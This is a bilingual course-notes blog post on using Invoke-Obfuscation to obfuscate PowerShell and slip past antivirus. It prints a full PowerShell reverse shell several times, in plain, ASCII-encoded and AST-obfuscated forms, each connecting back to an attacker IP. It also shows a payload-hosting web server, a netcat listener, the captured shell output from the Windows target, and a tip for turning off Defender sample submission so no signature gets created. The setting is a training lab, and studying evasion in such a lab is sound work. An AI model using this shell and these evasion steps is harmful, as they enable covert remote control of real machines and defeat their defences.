---
layout: post
title: "Obfuscating PowerShell Code"
date: "2023-05-23"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Obfuscating PowerShell Code
## Obfuscation
Obfuscation refers to the process of concealing something important, valuable, or critical. Obfuscation reorganizes code in order to make it harder to analyze or RE.

As a penetration tester, you will find yourself working with PowerShell code frequently. Most AV solutions will immediately flag malicious PowerShell code, as a result, you must be able to obfuscate/encode your PowerShell code and scripts in order to avoid detection.

## Invoke-Obfuscation
Invoke-Obfuscation is an open source PowerShell v2.0+ compatible PowerShell command and script obfuscator.

GitHub Repo: https://github.com/danielbohannon/Invoke-Obfuscation/

# PowerShell代码混淆
## 混淆
混淆是指隐藏重要、有价值或关键内容的过程。混淆重新组织代码，使其更难分析或逆向工程。

作为渗透测试人员，你经常会处理PowerShell代码。大多数杀毒软件解决方案会立即标记恶意的PowerShell代码，因此你必须能够对你的PowerShell代码和脚本进行混淆/编码，以避免被检测到。

## Invoke-Obfuscation
Invoke-Obfuscation是一个开源的、与PowerShell v2.0+兼容的PowerShell命令和脚本混淆器。

GitHub存储库：https://github.com/danielbohannon/Invoke-Obfuscation/

# Demo: Obfuscating PowerShell Code（演示：混淆 PowerShell 代码）
We are going to be exploring the process of how to obfuscate PowerShell code in order to evade or avoid antivirus detection.

In the context of an antivirus solution, obfuscation will make it harder to flag or rather harder to analyze as and obviously categorize as either malicious or not. 

[danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation/)

The way it works is that it allows us to load up or to load in our PowerShell script that we want to execute on the target. It then provides us with various options that we can use to obfuscate or encode the code. And then generates the output, which we can then save into a new PowerShell script, and that PowerShell script is fully obfuscated or encoded, and we can then transfer that to the target system for execution. Or alternatively, that code can be included as part of a larger exploit. 

How do we execute or load or import a PowerShell module on Linux? We can run PowerShell on Linux, and that can be done by installing the PowerShell package, which is part of the Kali Linux repositories. That will allow us to import the Invoke-Obfuscation PowerShell module here. And consequently, allow us to load up Invoke-Obfuscation, which we can then use to pass in our reverse shell code, which is going to be in PowerShell.

```
sudo apt-get install powershell -y
```

How do you launch PowerShell on Linux?

```
pwsh
```

We have access to a PowerShell session on Linux. So that means we can execute PowerShell scripts and import modules that we can then use.

```
PS /home/kali/Desktop/AVBypass> cd ./Invoke-Obfuscation/
PS /home/kali/Desktop/AVBypass/Invoke-Obfuscation> dir
PS /home/kali/Desktop/AVBypass/Invoke-Obfuscation> Import-Module ./Invoke-Obfuscation.psd1
PS /home/kali/Desktop/AVBypass/Invoke-Obfuscation> cd ..
PS /home/kali/Desktop/AVBypass> Invoke-Obfuscation
```

What's the most important here is the obfuscation or encoding techniques.

You then have AST, which is what we are going to be using. And this is for PowerShell version 3 and higher. That's because the target is running Windows 10, and this specific technique works probably the best out of all of them.

Firstlt, we need to create our reverse shell PowerShell script.

[Reverse Shell Cheatsheet Powershell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Kali Linux: 10.10.10.10

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Save it to /home/kali/Desktop/AVBypass/shell.ps1.

What do we do with Invoke-Obfuscate? How do we load that file?

```
Invoke-Obfuscation> SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
```

If I wanted to encode my PowerShell code, 

```
Invoke-Obfuscation> ENCODING
```

```
Invoke-Obfuscation\Encoding> 1
```

It'll output the PowerShell code that has now been encoded in ASCII. So I can then copy that and save it in a new PowerShell script, and then transfer that over to the target.

Open up the documentation: 

```
Invoke-Obfuscation\Encoding> help
```

Reset all obfuscation.

```
Invoke-Obfuscation\Encoding> RESET
```

Take a step back.

```
Invoke-Obfuscation\Encoding> BACK
```

Set the script path.

```
Invoke-Obfuscation> SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
```

Obfuscate PowerShell Ast nodes.

```
Invoke-Obfuscation> AST
```

Use the ALL options. This will select all the choices from the above. So it's going to obfuscate all of the various PowerShell AST nodes.

```
Invoke-Obfuscation\AST> ALL
```

To execute all obfuscation techniques.

```
Invoke-Obfuscation\AST\ALL> 1
```

Save it as /home/kali/Desktop/AVBypass/obfuscated.ps1

It's obfuscated all the PowerShell AST nodes.

Now that we've been able to create a new obfuscated PowerShell script, we can transfer this over to the target system.

We need to host a web server, so that we can download the obfuscated PowerShell script onto the Windows target. We then need to set up a Netcat listener that will listen for any connection from the target. 

```
nc -nvlp 1234
```

```
pwd
/home/kali/Desktop/AVBypass

ls
sudo python3 -m http.server 80
```

Switch over to Windows 10 VM.

Windows Security -> Virus & threat protection -> Virus & threat protection settings -> Manage settings

Real-time protection->On

Cloud-delivered protection->Off

Automatic sample submission->Off

The reason I've disabled automatic sample submission is in the event that I'm testing some obfuscation techniques, I don't want Microsoft to send the virus samples or the code sample, as they will create a signature for it immediately or whenever they get time to do that. I've left real-time protection on. This doesn't mean that it's been disabled. Virus & threat protection settings is Turn on.

```
http://10.10.10.10
```

obfuscated.ps1. Run with PowerShell. And if it works successfully, the PowerShell code that we used should leave the PowerShell window or terminal open or running as long as the execution was successful.

It's working because the PowerShell window is not closed. If it was detected, I would get a notification from Windows Defender, and the PowerShell session would be terminated.

Switch over to Kali Linux VM.

I should get a PowerShell session. This is a remote or a PowerShell reverse shell.

```
nc -nvlp 1234

PS C:\Users\IEUser\Downloads> whoami
PS C:\Users\IEUser\Downloads> systeminfo
```

# 复现视频内容

[danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation/)

```
┌──(root㉿kali)-[~]
└─# apt install powershell -y
```

```
┌──(root㉿kali)-[~/Desktop/AVBypass/Invoke-Obfuscation]
└─# pwsh
PowerShell 7.2.6
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.


┌──(root㉿kali)-[/root/Desktop/AVBypass/Invoke-Obfuscation]
└─PS> dir

    Directory: /root/Desktop/AVBypass/Invoke-Obfuscation

UnixMode   User             Group                 LastWriteTime           Size Name
--------   ----             -----                 -------------           ---- ----
-rw-r--r-- root             root                5/23/2023 09:53         131795 Invoke-Obfuscation.ps1
-rw-r--r-- root             root                5/23/2023 09:53           2260 Invoke-Obfuscation.psd1
-rw-r--r-- root             root                5/23/2023 09:53           4815 Invoke-Obfuscation.psm1
-rw-r--r-- root             root                5/23/2023 09:53          11350 LICENSE
-rw-r--r-- root             root                5/23/2023 09:53          40532 Out-CompressedCommand.ps1
-rw-r--r-- root             root                5/23/2023 09:53          46942 Out-EncodedAsciiCommand.ps1
-rw-r--r-- root             root                5/23/2023 09:53          51028 Out-EncodedBinaryCommand.ps1
-rw-r--r-- root             root                5/23/2023 09:53          49484 Out-EncodedBXORCommand.ps1
-rw-r--r-- root             root                5/23/2023 09:53          49340 Out-EncodedHexCommand.ps1
-rw-r--r-- root             root                5/23/2023 09:53          48866 Out-EncodedOctalCommand.ps1
-rw-r--r-- root             root                5/23/2023 09:53          51672 Out-EncodedSpecialCharOnlyCommand.ps1
-rw-r--r-- root             root                5/23/2023 09:53          62620 Out-EncodedWhitespaceCommand.ps1
-rw-r--r-- root             root                5/23/2023 09:53         258616 Out-ObfuscatedAst.ps1
-rw-r--r-- root             root                5/23/2023 09:53         100300 Out-ObfuscatedStringCommand.ps1
-rw-r--r-- root             root                5/23/2023 09:53         213452 Out-ObfuscatedTokenCommand.ps1
-rw-r--r-- root             root                5/23/2023 09:53         195774 Out-PowerShellLauncher.ps1
-rw-r--r-- root             root                5/23/2023 09:53          50590 Out-SecureStringCommand.ps1
-rw-r--r-- root             root                5/23/2023 09:53           8326 README.md


┌──(root㉿kali)-[/root/Desktop/AVBypass/Invoke-Obfuscation]
└─PS> Import-Module ./Invoke-Obfuscation.psd1

┌──(root㉿kali)-[/root/Desktop/AVBypass/Invoke-Obfuscation]
└─PS> cd ..

┌──(root㉿kali)-[/root/Desktop/AVBypass]
└─PS> Invoke-Obfuscation
```

```
┌──(root㉿kali)-[/root/Desktop/AVBypass]
└─PS> Invoke-Obfuscation     

IEX( ( '36{78Q55@32t61_91{99@104X97{114Q91-32t93}32t93}32t34@110m111@105}115X115-101m114_112@120@69-45{101@107X111m118m110-73Q124Q32X41Q57@51-93Q114_97_104t67t91{44V39Q112_81t109@39}101{99@97}108{112}101}82_45m32_32X52{51Q93m114@97-104{67t91t44t39V98t103V48t39-101}99}97V108}112t101_82_45{32@41X39{41_112t81_109_39m43{39-110t101@112{81t39X43@39t109_43t112_81Q109t101X39Q43m39}114Q71_112{81m109m39@43X39V32Q40}32m39_43_39{114-111m108t111t67{100m110{117Q39_43m39-111-114Q103_101t114@39m43-39{111t70-45}32m41}98{103V48V110Q98t103{48@39{43{39-43{32t98m103_48{111@105t98@103V48-39@43{39_32-32V43V32}32t98t103@48X116m97V99t98X103t48_39V43m39@43-39X43Q39_98@103@48}115V117V102Q98V79m45@98m39Q43{39X103_39X43Q39V48}43-39}43t39}98-103{48V101_107Q39t43X39_111X118X110V39X43}39t98_103{48@43}32_98{103}48{73{98-39@43t39m103_39}43{39{48Q32t39X43X39-32{40V32t41{39Q43V39m98X103{39_43V39{48-116{115Q79{39_43_39}98}103m48{39Q43t39X32X43{32_98@103-39@43m39X48_72-39_43t39V45m39t43Q39_101Q98}103_48-32_39Q43V39V32t39V43}39m43Q32V98X39Q43_39@103_48V39@43Q39@116X73t82V119m98-39{43_39}103Q48X40_46_32m39}40_40{34t59m91@65V114V114@97_121}93Q58Q58V82Q101Q118Q101{114}115_101m40_36_78m55@32t41t32-59{32}73{69V88m32{40t36V78t55}45Q74m111@105-110m32X39V39-32}41'.SpLiT( '{_Q-@t}mXV' ) |ForEach-Object { ([Int]$_ -AS [Char]) } ) -Join'' )                                                                                                  
  |    |    |    |                                                                                                                                                                                                                         
  |    |    |    |  
 \ /  \ /  \ /  \ / 
  V    V    V    V  
$N7 =[char[ ] ] "noisserpxE-ekovnI| )93]rahC[,'pQm'ecalpeR-  43]rahC[,'bg0'ecalpeR- )')pQm'+'nepQ'+'m+pQme'+'rGpQm'+' ( '+'roloCdnu'+'orger'+'oF- )bg0nbg0'+'+ bg0oibg0'+'  +  bg0tacbg0'+'+'+'bg0sufbO-b'+'g'+'0+'+'bg0ek'+'ovn'+'bg0+ bg0Ib'+'g'+'0 '+' ( )'+'bg'+'0tsO'+'bg0'+' + bg'+'0H'+'-'+'ebg0 '+' '+'+ b'+'g0'+'tIRwb'+'g0(. '((";[Array]::Reverse($N7 ) ; IEX ($N7-Join '' )                                                                                               
  |    |    |                                                                                                                                                                                                                              
  |    |    |  
 \ /  \ /  \ / 
  V    V    V  
.("wRIt" +  "e-H" + "Ost") (  "I" +"nvoke"+"-Obfus"+"cat"  +  "io" +"n") -ForegroundColor ( 'Gre'+'en')
  |    |                                                                                                                                                                                                                                   
  |    |  
 \ /  \ / 
  V    V  
Write-Host "Invoke-Obfuscation" -ForegroundColor Green
  |                                                                                                                                                                                                                                        
  |  
 \ / 
  V  
Invoke-Obfuscation

            ____                 __                              
           /  _/___ _   ______  / /_____                                                                                                                                                                                                   
           / // __ \ | / / __ \/ //_/ _ \______                                                                                                                                                                                            
         _/ // / / / |/ / /_/ / ,< /  __/_____/                                                                                                                                                                                            
        /______ /__|_________/_/|_|\___/         __  _                                                                                                                                                                                     
          / __ \/ /_  / __/_  ________________ _/ /_(_)___  ____                                                                                                                                                                           
         / / / / __ \/ /_/ / / / ___/ ___/ __ `/ __/ / __ \/ __ \                                                                                                                                                                          
        / /_/ / /_/ / __/ /_/ (__  ) /__/ /_/ / /_/ / /_/ / / / /                                                                                                                                                                          
        \____/_.___/_/  \__,_/____/\___/\__,_/\__/_/\____/_/ /_/                                                                                                                                                                           
                                                                                                                                                                                                                                           
        Tool    :: Invoke-Obfuscation
        Author  :: Daniel Bohannon (DBO)                                                                                                                                                                                                   
        Twitter :: @danielhbohannon                                                                                                                                                                                                        
        Blog    :: http://danielbohannon.com                                                                                                                                                                                               
        Github  :: https://github.com/danielbohannon/Invoke-Obfuscation                                                                                                                                                                    
        Version :: 1.8                                                                                                                                                                                                                     
        License :: Apache License, Version 2.0                                                                                                                                                                                             
        Notes   :: If(!$Caffeinated) {Exit}                                                                                                                                                                                                
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
HELP MENU :: Available options shown below:                                                                                                                                                                                                

[*]  Tutorial of how to use this tool             TUTORIAL
[*]  Show this Help Menu                          HELP,GET-HELP,?,-?,/?,MENU
[*]  Show options for payload to obfuscate        SHOW OPTIONS,SHOW,OPTIONS
[*]  Clear screen                                 CLEAR,CLEAR-HOST,CLS
[*]  Execute ObfuscatedCommand locally            EXEC,EXECUTE,TEST,RUN
[*]  Copy ObfuscatedCommand to clipboard          COPY,CLIP,CLIPBOARD
[*]  Write ObfuscatedCommand Out to disk          OUT
[*]  Reset ALL obfuscation for ObfuscatedCommand  RESET
[*]  Undo LAST obfuscation for ObfuscatedCommand  UNDO
[*]  Go Back to previous obfuscation menu         BACK,CD ..
[*]  Quit Invoke-Obfuscation                      QUIT,EXIT
[*]  Return to Home Menu                          HOME,MAIN


Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING      Obfuscate entire command as a String
[*] ENCODING    Obfuscate entire command via Encoding
[*] COMPRESS    Convert entire command to one-liner and Compress
[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)


Invoke-Obfuscation> 
```

Kali Linux: 192.168.213.128

Windows 10: 192.168.213.133

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

save it to /root/Desktop/AVBypass/shell.ps1.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.213.128',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```
Invoke-Obfuscation> SET SCRIPTPATH /root/Desktop/AVBypass/shell.ps1

Successfully set ScriptPath:
/root/Desktop/AVBypass/shell.ps1                                                                                                                                                     Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING      Obfuscate entire command as a String
[*] ENCODING    Obfuscate entire command via Encoding
[*] COMPRESS    Convert entire command to one-liner and Compress
[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)

Invoke-Obfuscation> 
```

```
Invoke-Obfuscation> ENCODING


Choose one of the below Encoding options to APPLY to current payload:

[*] ENCODING\1          Encode entire command as ASCII
[*] ENCODING\2          Encode entire command as Hex
[*] ENCODING\3          Encode entire command as Octal
[*] ENCODING\4          Encode entire command as Binary
[*] ENCODING\5          Encrypt entire command as SecureString (AES)
[*] ENCODING\6          Encode entire command as BXOR
[*] ENCODING\7          Encode entire command as Special Characters
[*] ENCODING\8          Encode entire command as Whitespace
```

```
Invoke-Obfuscation\Encoding> 1

Executed:
  CLI:  Encoding\1
  FULL: Out-EncodedAsciiCommand -ScriptBlock $ScriptBlock -PassThru                                                                                                                                                                        
                                                                                                                                                                                                                                           
Result:
iNvOke-EXpREsSION ( "$(sEt-vaRIABLe  'Ofs' '' )" + [sTriNg]( '36b99X108;105b101,110y116,32n61y32u78W101X119}45n79X98;106u101,99b116X32u83b121X115X116}101n109b46b78y101X116q46y83u111n99y107}101;116,115W46n84y67;80q67n108X105u101;110W116W40b39;49n57;50}46;49,54n56}46b50}49;51,46,49q50}56X39}44W49}50}51X52W41W59,36n115X116u114;101}97W109,32u61n32;36n99n108b105y101,110b116X46;71q101y116}83u116;114W101b97X109q40u41W59}91,98q121y116X101;91;93;93,36b98;121q116y101}115u32n61u32u48b46y46b54,53;53,51;53W124y37W123}48b125y59}119n104b105W108,101b40q40q36;105X32y61u32u36;115b116b114q101;97W109u46X82W101n97q100X40q36b98b121}116q101X115b44u32u48W44X32X36n98,121}116}101b115}46y76b101,110y103y116n104u41X41u32,45y110b101q32X48,41y123;59q36n100y97q116;97q32X61b32}40,78n101y119n45W79n98n106;101,99y116u32q45y84}121X112;101,78;97;109X101X32W83;121X115n116W101u109;46W84y101}120n116}46}65u83n67n73n73y69;110X99W111q100;105y110W103W41q46y71,101n116X83n116;114}105,110W103n40W36X98q121q116q101u115u44q48X44q32W36u105X41;59u36;115b101X110W100;98,97y99W107u32y61q32q40W105W101b120u32}36}100b97u116W97q32W50y62X38;49b32}124y32W79W117u116W45q83n116q114X105n110;103}32}41q59q36,115,101X110n100b98b97b99,107,50y32W61}32W36}115X101,110;100b98q97y99b107,32y43;32}39W80y83;32;39X32q43X32X40n112y119W100}41W46X80}97q116}104X32;43X32y39X62q32y39b59W36X115b101q110u100}98b121u116q101b32;61y32q40b91b116X101n120y116,46;101}110n99b111n100}105u110q103,93}58;58u65;83,67b73q73y41b46,71q101X116n66W121n116n101;115u40,36u115,101,110b100;98X97y99W107}50u41n59y36,115y116y114n101u97y109,46b87}114}105b116X101;40}36u115}101b110u100W98X121W116,101q44b48n44X36n115y101y110b100}98}121W116X101W46,76X101u110u103}116,104u41n59y36y115u116W114n101u97,109y46u70n108n117y115q104;40,41y125,59u36;99u108}105}101y110;116}46,67u108u111X115;101,40}41,10'-sPlIT 'n'-SpLIT'q' -sPLIt '}' -sPlIt'b' -SPlit'y'-SpLit'u' -SpLiT 'W'-SPLit'X'-sPLit ',' -spLIt ';'| FOReach-obJeCt {([inT] $_-AS [ChAR]) } )+" $( sET-iTeM 'vaRiable:OFS'  ' ') " )                                                                                                                                
                                                                                                                                                                                                                                           

Choose one of the below Encoding options to APPLY to current payload:

[*] ENCODING\1          Encode entire command as ASCII
[*] ENCODING\2          Encode entire command as Hex
[*] ENCODING\3          Encode entire command as Octal
[*] ENCODING\4          Encode entire command as Binary
[*] ENCODING\5          Encrypt entire command as SecureString (AES)
[*] ENCODING\6          Encode entire command as BXOR
[*] ENCODING\7          Encode entire command as Special Characters
[*] ENCODING\8          Encode entire command as Whitespace


Invoke-Obfuscation\Encoding> 
```

```
Invoke-Obfuscation\Encoding> RESET

                                                                                                                                                                                                                                           
Successfully reset ObfuscatedCommand.                                                                                                                                                                                                      
                                                                                                                                                                                                                                           

Choose one of the below Encoding options to APPLY to current payload:

[*] ENCODING\1          Encode entire command as ASCII
[*] ENCODING\2          Encode entire command as Hex
[*] ENCODING\3          Encode entire command as Octal
[*] ENCODING\4          Encode entire command as Binary
[*] ENCODING\5          Encrypt entire command as SecureString (AES)
[*] ENCODING\6          Encode entire command as BXOR
[*] ENCODING\7          Encode entire command as Special Characters
[*] ENCODING\8          Encode entire command as Whitespace
```

```
Invoke-Obfuscation\Encoding> BACK 


Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING      Obfuscate entire command as a String
[*] ENCODING    Obfuscate entire command via Encoding
[*] COMPRESS    Convert entire command to one-liner and Compress
[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)
```

```
Invoke-Obfuscation> SET SCRIPTPATH /root/Desktop/AVBypass/shell.ps1

                                                                                                                                                                                                                                           
Successfully set ScriptPath:                                                                                                                                                                                                               
/root/Desktop/AVBypass/shell.ps1                                                                                                                                                                                                           
                                                                                                                                                                                                                                           

Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING      Obfuscate entire command as a String
[*] ENCODING    Obfuscate entire command via Encoding
[*] COMPRESS    Convert entire command to one-liner and Compress
[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)
```

```
Invoke-Obfuscation> AST


Choose one of the below AST options:

[*] AST\NamedAttributeArgumentAst       Obfuscate NamedAttributeArgumentAst nodes
[*] AST\ParamBlockAst                   Obfuscate ParamBlockAst nodes
[*] AST\ScriptBlockAst                  Obfuscate ScriptBlockAst nodes
[*] AST\AttributeAst                    Obfuscate AttributeAst nodes
[*] AST\BinaryExpressionAst             Obfuscate BinaryExpressionAst nodes
[*] AST\HashtableAst                    Obfuscate HashtableAst nodes
[*] AST\CommandAst                      Obfuscate CommandAst nodes
[*] AST\AssignmentStatementAst          Obfuscate AssignmentStatementAst nodes
[*] AST\TypeExpressionAst               Obfuscate TypeExpressionAst nodes
[*] AST\TypeConstraintAst               Obfuscate TypeConstraintAst nodes
[*] AST\ALL                             Select All choices from above
```

```
Invoke-Obfuscation\AST> ALL


Choose one of the below AST\All options to APPLY to current payload:

[*] AST\ALL\1           Execute ALL Ast obfuscation techniques
```

```
Invoke-Obfuscation\AST\All> 1

Executed:
  CLI:  AST\All\1
  FULL: Out-ObfuscatedAst -ScriptBlock $ScriptBlock                                                                                                                                                                                        
                                                                                                                                                                                                                                           
Result:
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('192.168.213.128',1234));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()                            
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           

Choose one of the below AST\All options to APPLY to current payload:

[*] AST\ALL\1           Execute ALL Ast obfuscation techniques
```

save it as /root/Desktop/AVBypass/obfuscated.ps1

```powershell
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('192.168.213.128',1234));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234
listening on [any] 1234 ...
```

```
┌──(root㉿kali)-[~/Desktop/AVBypass]
└─# pwd 
/root/Desktop/AVBypass
                                                                                                                    
┌──(root㉿kali)-[~/Desktop/AVBypass]
└─# ls    
Invoke-Obfuscation  obfuscated.ps1  shell.ps1
                                                                                                                    
┌──(root㉿kali)-[~/Desktop/AVBypass]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![2023-05-23 223727.png](/img/in-post/ine/2023-05-23-223727.png)

![2023-05-23 224036.png](/img/in-post/ine/2023-05-23-224036.png)

```
http://192.168.213.128/
```

Download obfuscated.ps1.

![2023-05-23 224529.png](/img/in-post/ine/2023-05-23-224529.png)

![2023-05-23 224837.png](/img/in-post/ine/2023-05-23-224837.png)

```
┌──(root㉿kali)-[~]
└─# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.213.128] from (UNKNOWN) [192.168.213.133] 49868

PS C:\Users\Nahida\Downloads> whoami
desktop-6v32uca\nahida
PS C:\Users\Nahida\Downloads> systeminfo

???:           DESKTOP-6V32UCA
OS ??:          Microsoft Windows 10 ??? LTSC
OS ??:          10.0.19044 ?? Build 19044
OS ???:        Microsoft Corporation
OS ??:          ?????
OS ????:      Multiprocessor Free
??????:     Windows ??
?????:       
?? ID:          00425-00000-00002-AA274
??????:     2023/5/23, 10:06:52
??????:     2023/5/23, 22:03:24
?????:       VMware, Inc.
????:         VMware20,1
????:         x64-based PC
???:           ??? 2 ?????
                  [01]: Intel64 Family 6 Model 165 Stepping 2 GenuineIntel ~2304 Mhz
                  [02]: Intel64 Family 6 Model 165 Stepping 2 GenuineIntel ~2304 Mhz
BIOS ??:        VMware, Inc. VMW201.00V.20904234.B64.2212051119, 2022/12/5
Windows ??:     C:\Windows
????:         C:\Windows\system32
????:         \Device\HarddiskVolume1
??????:     zh-cn;??(??)
???????:   zh-cn;??(??)
??:             (UTC+08:00) ??????????????????
??????:     2,047 MB
???????:   1,355 MB
????: ???: 3,199 MB
????: ??:   1,682 MB
????: ???: 1,517 MB
??????:     C:\pagefile.sys
?:               WORKGROUP
?????:       \\DESKTOP-6V32UCA
????:         ??? 5 ??????
                  [01]: KB5004331
                  [02]: KB5003791
                  [03]: KB5026037
                  [04]: KB5006670
                  [05]: KB5005699
??:             ??? 1 ? NIC?
                  [01]: Intel(R) 82574L Gigabit Network Connection
                      ???:      Ethernet0
                      ?? DHCP:   ?
                      DHCP ???: 192.168.213.254
                      IP ??
                        [01]: 192.168.213.133
                        [02]: fe80::a16f:bbed:5518:9171
Hyper-V ??:     ???????????????? Hyper-V ??????
```

While shell.ps1 will be blocked by Microsoft Defender.

![2023-05-23 225509.png](/img/in-post/ine/2023-05-23-225509.png)
